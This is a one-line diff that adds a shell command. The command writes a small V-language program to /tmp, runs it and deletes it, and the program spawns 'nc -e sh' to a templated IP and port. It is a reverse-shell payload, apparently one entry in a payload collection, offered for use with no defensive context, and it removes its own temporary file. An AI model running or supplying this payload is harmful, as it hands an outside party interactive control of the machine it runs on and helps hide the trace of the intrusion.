@@ -1,0 +1,1 @@
+echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh {{IP}} {{PORT}} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v
